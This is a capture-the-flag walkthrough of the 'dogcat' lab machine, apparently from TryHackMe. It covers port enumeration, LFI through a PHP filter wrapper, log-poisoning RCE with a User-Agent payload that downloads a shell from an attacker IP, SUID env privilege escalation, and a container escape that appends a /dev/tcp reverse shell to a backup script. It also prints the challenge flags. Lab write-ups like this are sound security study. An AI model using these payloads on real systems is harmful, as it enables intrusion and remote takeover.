# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
| 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
| 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp open http syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# RECONNAISSANCE
---

Let's visit the web application:

![Pasted image 20250326111953.png](../../IMAGES/Pasted%20image%2020250326111953.png)

If we click on any of them, we can see this:

![Pasted image 20250326112012.png](../../IMAGES/Pasted%20image%2020250326112012.png)

We can view that the url is:

```
http://IP/?view=dog
```

This view parameter could be vulnerable to LFI, let's try to visualize a resource that may not exist:


![Pasted image 20250326112145.png](../../IMAGES/Pasted%20image%2020250326112145.png)

If we try anything else, this happens:

![Pasted image 20250326113812.png](../../IMAGES/Pasted%20image%2020250326113812.png)



This means that we must include either `dog` or `cat` in the request, let's try to read `index.php` using a php wrapper, since we need to include `dog` or `cat`, we can test the following payload:

```
php://filter/convert.base64-encode/resource=dog/../../../../var/www/html/index
```


If we submit the request:

![Pasted image 20250326114737.png](../../IMAGES/Pasted%20image%2020250326114737.png)

There we go, we got LFI, let's proceed to exploitation.



# EXPLOITATION
---

Let's start by reading the `index.php` file:


```html
<!DOCTYPE HTML>
<html>

<head>
 <title>dogcat</title>
 <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
 <h1>dogcat</h1>
 <i>a gallery of various dogs or cats</i>

 <div>
 <h2>What would you like to see?</h2>
 <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
 <?php
 function containsStr($str, $substr) {
 return strpos($str, $substr) !== false;
 }
	 $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
 if(isset($_GET['view'])) {
 if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
 echo 'Here you go!';
 include $_GET['view'] . $ext;
 } else {
 echo 'Sorry, only dogs or cats are allowed.';
 }
 }
 ?>
 </div>
</body>

</html>
```


From this, we got some valuable stuff, for example, it tries to set the extension to `.php` if `ext` is not defined, knowing this, we can try reading `/etc/passwd`:

```
php://filter/convert.base64-encode/resource=./dog/../../../../etc/passwd&ext
```

![Pasted image 20250326120715.png](../../IMAGES/Pasted%20image%2020250326120715.png)

It worked, let's read the contents:

```
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=' | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Seems like there's no way to get a shell, it does not seem like an user got a bash shell, let's try some other stuff, for example, we can get RCE, by log poisoning:

PoC: https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/

Let's perform the RCE, we can upload a reverse shell to speed up the process, let's do the following, let's go to:

```
?view=./dog/../../../../../../var/log/apache2/access.log&ext=
```

In this way, we can see the log:


![Pasted image 20250326124107.png](../../IMAGES/Pasted%20image%2020250326124107.png)

Now, with this, we can perform log poisoning, let's send the request to our proxy and start a python server to get our `shell.php` file, for this, we need to use the following `User-Agent`:

```
<?php file_put_contents('shell.php', file_get_contents('http://10.6.34.159:8000/shell.php')); ?>
```

![Pasted image 20250326124815.png](../../IMAGES/Pasted%20image%2020250326124815.png)

Now, let's send the request and refresh the page, we can see in our python server that the file has been indeed downloaded:

![Pasted image 20250326124827.png](../../IMAGES/Pasted%20image%2020250326124827.png)

We can now simply set up the listener and access the following URL:

```
http://IP/shell.php
```

And we can see this in our listener

![Pasted image 20250326124927.png](../../IMAGES/Pasted%20image%2020250326124927.png)

We got a shell, let's proceed to privesc.




# PRIVILEGE ESCALATION
---


First step would be getting an stable shell:

1. /usr/bin/script -qc /bin/bash /dev/null
2. CTRL + Z
3. stty raw -echo; fg
4. reset xterm
5. export TERM=xterm
6. export BASH=bash

![Pasted image 20250326125041.png](../../IMAGES/Pasted%20image%2020250326125041.png)

If we check `/`, we can see this:

![Pasted image 20250326125149.png](../../IMAGES/Pasted%20image%2020250326125149.png)

Seems like we are inside of a docker container, let's test:

```
cat /proc/1/cgroup

12:pids:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
11:blkio:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
10:hugetlb:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
9:net_cls,net_prio:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
8:perf_event:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
7:freezer:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
6:cpu,cpuacct:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
5:cpuset:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
4:memory:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
3:devices:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
2:rdma:/
1:name=systemd:/docker/923f169d93ee48dac929199d2c482f18c290068c0db8462353d8103387e99c9c
0::/system.slice/containerd.service
```

We are inside of a docker container, let's test for some way to get root inside of this container, for example, let's check `SUID` with `4000`:

```
find / -perm -4000 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/sudo
```

We got something `env`, let's check it on `gtfobins`:

![Pasted image 20250326125537.png](../../IMAGES/Pasted%20image%2020250326125537.png)

We can do the following to get root in the docker container:

```
/usr/bin/env /bin/bash -p
```

![Pasted image 20250326125619.png](../../IMAGES/Pasted%20image%2020250326125619.png)

Since we got root we can read some flags, let's start reading them:

```
bash-5.0# find / -name flag* 2>/dev/null
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
/root/flag3.txt
```

```
bash-5.0# cat /var/www/html/flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

```
bash-5.0# cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
```


```
bash-5.0# cat /root/flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```

Ok, we've read the flags, now, we can use the `nmap` binary to scan the network and check if there's anything important to get root on the real machine:

Binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

Let's get it in our local machine and start a python server, now, let's get it:

```
curl http://10.6.34.159:8000/nmap -o nmap
```


If we try scanning the network it does not seem to work, this is not the intended path:

![Pasted image 20250326130533.png](../../IMAGES/Pasted%20image%2020250326130533.png)

Let's use linpeas then, we must be missing something:

![Pasted image 20250326131049.png](../../IMAGES/Pasted%20image%2020250326131049.png)

In the backup files, we can see this, there seems to be a `backup.sh` script, let's read it:

```
bash-5.0# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

We can modify this script to send ourselves a reverse shell, let's change the contents to these:

```
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container # Original command
/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' & # Reverse shell
```

```
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.6.34.159/9001 0>&1" &' >> backup.sh
```

Set up a new listener, after little time, this happens in our listener:

![Pasted image 20250326132008.png](../../IMAGES/Pasted%20image%2020250326132008.png)

There we go, we got our root shell, escaping successfully the docker container, let's read final flag:

```
root@dogcat:~# cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

![Pasted image 20250326132106.png](../../IMAGES/Pasted%20image%2020250326132106.png)

